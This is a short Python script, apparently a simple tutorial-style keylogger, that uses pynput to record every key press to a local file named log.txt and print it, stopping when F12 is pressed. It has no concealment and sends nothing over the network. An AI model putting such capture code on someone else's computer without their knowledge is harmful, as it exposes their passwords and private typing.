from pynput.keyboard import Listener

def on_press(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    with open("log.txt","a") as file:
        file.write(key)
    print(key)

def start_keylog():
    with Listener(on_press=on_press) as listener:
        listener.join()
    
